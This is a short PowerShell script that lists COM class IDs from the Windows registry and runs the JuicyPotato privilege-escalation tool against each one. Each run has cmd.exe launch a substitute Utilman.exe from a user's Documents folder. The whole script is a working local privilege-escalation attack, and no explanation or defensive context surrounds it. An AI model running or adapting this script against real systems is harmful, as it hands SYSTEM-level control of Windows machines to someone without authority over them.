# run-potato.ps1
# ----------------------------
# 1) Mount HKCR so we can enumerate COM classes
New-PSDrive -Name HKCR -PSProvider Registry -Root HKEY_CLASSES_ROOT | Out-Null

# 2) Grab all the keys under HKCR:\CLSID whose AppID is not null
$CLSIDs = Get-ItemProperty HKCR:\CLSID\* |
    Where-Object { $_.AppID -ne $null } |
    Select-Object -ExpandProperty PSChildName

# 3) (Re)create/overwrite clsid.txt and tee‑out each GUID
$CLSIDs | Tee-Object -FilePath clsid.txt | ForEach-Object {
    $guid = $_
    Write-Host "Testing CLSID $guid …"

    # 4) Invoke JuicyPotato.exe for each one
    & "C:\Users\DSU\Documents\JuicyPotato.exe" `
       -l 1337 `
       -m 0.0.0.0 `
       -t * `
       -p "C:\Windows\System32\cmd.exe" `
       -a '/c C:\Users\DSU\Documents\Utilman.exe' `
       -c $guid

    Write-Host "----"
}
